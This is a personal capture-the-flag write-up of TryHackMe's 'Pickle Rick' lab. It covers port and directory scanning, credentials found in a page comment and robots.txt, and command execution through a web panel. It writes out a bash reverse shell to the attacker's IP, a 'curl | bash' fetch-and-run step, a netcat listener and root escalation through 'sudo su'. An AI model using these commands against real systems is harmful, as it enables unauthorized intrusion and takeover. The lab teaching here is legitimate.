Overview
Field	Details
Lab / challenge	Pickle Rick (Rick and Morty)
Platform	TryHackMe
Category	Capture the Flag (CTF) · Web / Linux Security
Date completed	18/10/2026
Difficulty	Begginer
Environment	Authorized CTF laboratory
Objective	Locate the three requested flags/ingredients in the challenge environment.


1. Objective and Scope
The goal of this challenge was to explore a deliberately vulnerable, Rick and Morty-themed environment and locate three pieces of information requested by the CTF. 
Work was performed exclusively within the authorized challenge infrastructure.

2. Lab Setup and Tools
- Operating system: Kali Linux VM
- Connectivity: Tryhackme VPN
- Target identifier: lab machine
- Tools used: terminal, browser
3. Methodology and Findings
3.1 Reconnaissance
Purpose: Identify available services, exposed interfaces, and initial points of investigation.
Summary: Access and analyze web server witch commands and discovered a web log in that gives access to a command panel 
- Actions performed: 
  -Send a small ping to verify I'm connected to the machine and mi vpn works
    - *ping -c2 10.66.173.68* 
      **successful**
  -Start a ports scan to identify probable vulnerabilities and export results into a grapeable format easy to read and reutilize
    - sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.64.134.204 -oG allports
    - We discover that 2 ports are open the http/80 and ssh/22 both TCP
  -Start an aggresive scan to both ports to discover if information macthes and what servers are using
    - sudo nmap -p22,80 -sCV 10.64.134.204 -oN targeted
    - ssh is in fact an ssh and is on Ubuntu 20.04, information that opens opportunity with exploits techniques
    - http is on Apache on Ubuntu, we can try to access html web by ip
  - There is a web page that says we need to find 3 ingredients
  - I'll check page source code and next inspect with the browser's dev tools
    - I found an apparently username commented *RickRul3s*, I'll save it for now and we can try to search web directories
  - Lets numerate web directories of our page url, fast searching for php and txt archives too
    - gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.64.134.204/ -t 20 -x php,txt
    - Found 4 principal interesting files a login.php, assets, portal.php and robots.txt
    - Lets see robots.txt, because is plain text, it doesn't take too much time
      - http://10.64.134.204/robots.txt
      - Oh, I found something interesting, Wubbalubbadubdub, this is a thematic machine so I'll try in the found login.php
      - http://10.64.134.204/login.php
      - It worked, I'm logged, I see something that looks like a command system pannel, but I don't know what I can do
      - whoami
      - I'm *www-data* a normal user in apache, but we have access to the server
- Observation: 
3.2 Initial Access
- Entry point or clue: webshell by a command pannel, easy access to the file, it didn't required root permissions
- Why the method worked: web shell to stablish connection with servers system
- Actions performed:
  - Create an index where we are going to put our webshell
    - nano index.html
  - Obtain our ip output with the tryhackme's vpn
    - ifconfig
    - tun 0: inet 192.168.156.165
  - Put the reverse shell in the index
    - I'm going to inject a web RCE, telling bash to execute command as a string 
    - I need a interactive shell, capture error messages, open a TCP connection with my IP and port 443 listening, read the commands we are putting in our session
    - bash -c "bash -i >& /dev/tcp/192.168.156.165/443 0>&1"  save and exit
  - Verify if saves are applied
    - cat index.html yes, all good
  - Lets start a http server with python
    - sudo python3 -m http.server 80
  - Lets start the listening port 443 to receive connection
    - sudo nc -nlvp 443
  - Im going to start the get query to my server 80 with CURL, because I need the connection going directly to my index.html that has the reverse shell command
    - curl http://192.168.156.165 | bash
    - that pipe is taking curl output (my command) and converting it to the bash command 
  - After executing it, now I have access to the shell in my local session
    - www-data@ip-10-64-134-204:/var/www/html$
  - I want to feel comfortable reading and analyzing so I'm going to resize terminal to match mine
    - $ export TERM=xterm
    - $ script /dev/null -c bash
    - end connection
      - stty size
    - restart connection
      - stty raw -echo;fg
      - stty rows 33 columns 149
  - Start to work after that
      
3.3 Flag 1
- Location or discovery method: Main directory after access to the server
- Technical reasoning: I need to see what things can I do in every step, because it's important to improve time 
  and sometimes we don't know full access to complish our objectives
- Actions performed:
  - I want to know my permissions
    - $ whoami 
    - $ id     uid=33 gid=33 groups=33(www-data)
    - we still a www-data user, nothing changed, but lets see what I have access now
    - $ ls   
    - oh there is the first ingredient Sup3rs3cretPickl3Ingred.txt , lets see if I can open it
    - cat Sup3rs3cretPickl3Ingred.txt
    - yes, I can, perfect I have first flag
3.4 Flag 2
- Location or discovery method: File on a home directory, no root permissions required
- Technical reasoning: I need to check and start by the basics, something many system has is the home directory
- Actions performed: 
  - Lets check a common general directory, home
    - $ cd /home/
    - $ ls
    - rick ubuntu
    - $ cd rick/
    - $ ls 
    - 'second ingredients'
    - $ cat 'second ingredients'
  -Second flag done
3.5 Flag 3
- Location or discovery method: root directory
- Technical reasoning: When we don´t see the responses, we can try to obtain all system control by using a privilege scalation when we are already inside the system
3.6 Privilege Escalation 
- Starting permissions: normal user www-data
- Misconfiguration or weakness: server command panel
- How higher privileges were confirmed: whoami
- Security impact: Critic
- Actions performed:
  - Now I hace 2 of 3, but in my actual state i don´t found anything interesting, some files seems to be rabbitholes, lets see what a root user gies to us
    - $ sudo -l
    - It give us no passw to all files 
  - Lets try a basic command
    - $ sudo su
  - It worked, now we are superuser, lets navigate to the root directory
    - $ cd /root/
    - #ls
    - 3rd.txt
    - #cat 3rd.txt
  - Done
